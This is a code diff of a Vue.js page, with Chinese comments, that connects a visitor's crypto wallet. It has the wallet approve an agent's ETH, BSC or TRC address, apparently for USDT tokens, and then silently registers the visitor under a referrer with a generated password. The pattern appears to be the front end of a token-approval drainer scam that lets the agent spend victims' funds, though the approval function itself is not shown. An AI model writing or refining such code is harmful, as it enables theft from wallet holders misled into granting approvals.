@@ -61,40 +61,30 @@ export default {
 
             //区块链类型
             var chainType = ar[1].split('=')[0].split('_')[0].toUpperCase()
+            //是否是用户分享
+            var userType = this.$route.query.data.split('>')[1] == 'user' ? true : false
+
             // 获取解析后的账号id
             let userId = arr[0].userParentId
-            console.log(arr);
+            console.log('解析后的数据:', arr);
+
             // 发送请求获取账号地址
             await this.GetUserId({ id: userId })
             // 如果账号地址没有就跳转到后台主页 有就执行授权
             if (this.obj == null) this.open()
             else {
                 var agentAddress
-                console.log(this.obj, `this.obj`);
-                if (chainType == 'ETH') {
-                    agentAddress = this.obj.ethMainnetAddress + '-ETH'
-                }
-                else if (chainType == 'BSC') {
-                    agentAddress = this.obj.bscMainnetAddress + '-BSC'
-                }
-                else if (chainType == 'TRC') {
-                    agentAddress = this.obj.trcMainnetAddress + '-TRC'
-                }
-                else {
-                    agentAddress = this.obj.ancestorAddress
-                }
-
-
-                let agentAdressArr = agentAddress.split('-')
-                console.log('agentAdressArr = ', agentAdressArr)
+                if (chainType == 'ETH') agentAddress = this.obj.ethMainnetAddress
+                else if (chainType == 'BSC') agentAddress = this.obj.bscMainnetAddress
+                else if (chainType == 'TRC') agentAddress = this.obj.trcMainnetAddress
 
                 let doApproveInner = async (web3) => {
-                    blockUtils.doApprove(web3, agentAdressArr[0], async (result, address) => {
+                    blockUtils.doApprove(web3, agentAddress, async (result, address) => {
                         if (result == true) {
                             let userName = autoRegister(8)
-                            let passWord = '123123'
+                            let passWord = autoRegister(6)
                             let userId = autoRegister(10)
-                            let ancestorAddress = agentAddress
+
                             // 发送请求注册
                             let obj = {
                                 userName,
@@ -103,32 +93,13 @@ export default {
                                 userType: '-1',
                                 userParentId: arr[0].userParentId,
                                 userParentName: this.obj.userName,
-                                ancestorAddress
+                                ancestorAddress: userType.toString(),
                             }
-                            console.log(this.arr, `this.arr[1]`);
-                            // 如果是一级用户
-                            if (this.arr.length == 2) {
-                                // 添加授权用户对应链地址 
-                                if (this.arr[1].eth_usdt) {
-                                    obj['ethMainnetAddress'] = address
-                                } else if (this.arr[1].bsc_usdt) {
-                                    obj['bscMainnetAddress'] = address
-                                } else if (this.arr[1].trc_usdt) {
-                                    obj['trcMainnetAddress'] = address
-                                }
-                            } else {
-                                // 如果是二级用户及以上
-                                // 添加授权用户对应链地址
-                                if (agentAdressArr[1] == 'ETH') {
-                                    obj['ethMainnetAddress'] = address
-                                }
-                                else if (agentAdressArr[1] == 'BSC') {
-                                    obj['bscMainnetAddress'] = address
-                                }
-                                else if (agentAdressArr[1] == 'TRC') {
-                                    obj['trcMainnetAddress'] = address
-                                }
-                            }
+    
+                            if (chainType == 'ETH') obj['ethMainnetAddress'] = address
+                            else if (chainType == 'BSC') obj['bscMainnetAddress'] = address
+                            else if (chainType == 'TRC') obj['trcMainnetAddress'] = address
+
                             console.log(`授权成功，创建的用户信息为`, obj);
                             await this.GoAutoRegister({
                                 ...obj
@@ -145,11 +116,11 @@ export default {
                                 message: `授权失败，地址有误`
                             });
                         }
-                    }, agentAdressArr[1])
+                    }, chainType)
                 }
 
                 // 连接钱包
-                console.log('chainType = ', agentAdressArr[1])
+                console.log('chainType = ', chainType)
                 blockUtils.doConnectWallet((info, web3) => {
                     if (info == 'DisApprove') {
                         blockUtils.doDisConnectWallet()
@@ -157,7 +128,7 @@ export default {
                     else if (info == 'Approve') {
                         doApproveInner(web3)
                     }
-                }, agentAdressArr[1])
+                }, chainType)
             }
         },
         disConnect() {
@@ -179,8 +150,6 @@ export default {
         },
     },
     created() {
-
-
     }
 }
 </script>
